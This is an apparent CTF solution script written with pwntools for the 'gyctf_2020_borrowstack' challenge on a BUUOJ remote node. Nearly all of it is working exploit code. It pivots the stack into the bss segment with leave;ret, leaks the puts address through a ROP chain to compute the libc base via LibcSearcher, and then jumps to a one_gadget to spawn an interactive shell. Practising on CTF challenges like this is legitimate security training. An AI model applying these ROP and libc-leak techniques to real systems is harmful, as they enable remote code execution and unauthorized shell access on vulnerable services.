from pwn import *
from LibcSearcher import LibcSearcher
# context.log_level = 'debug'

#io = gdb.debug('./gyctf_2020_borrowstack','b main')
elf = ELF('./gyctf_2020_borrowstack')
ret_addr = 0x00000000004004c9
leave_ret_addr = 0x0000000000400699
pop_rdi_ret = 0x0000000000400703
padding = 0x60
bank_addr = 0x601080
io = remote('node5.buuoj.cn',28420)

def leak_puts_libc():
    payload1 = flat([b'A'*padding,p64(bank_addr),p64(leave_ret_addr)])
    io.sendafter(b'want\n',payload1)
    payload2 = p64(ret_addr)*20+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.sym['main']) #为什么这里不用填充leave的0x0   填充的p64(ret_addr)*20是因为该bss段距离got表太近会导致程序错误退出/ps:真的doge
    io.sendafter(b'Done!You can check and use your borrow stack now!\n',payload2)

    puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
    print('puts_addr->',hex(puts_addr))
    return puts_addr

def remote_pwn1(puts_addr):
    Lib = LibcSearcher('puts',puts_addr)
    libc_base = puts_addr - Lib.dump('puts')
    one_gadget=libc_base+0x4526a
    payload1 = b'A'*(padding+8)+p64(one_gadget)
    io.sendafter(b'want\n',payload1)
    io.interactive()

 


puts_addr = leak_puts_libc()
print('=====================')
remote_pwn1(puts_addr=puts_addr)

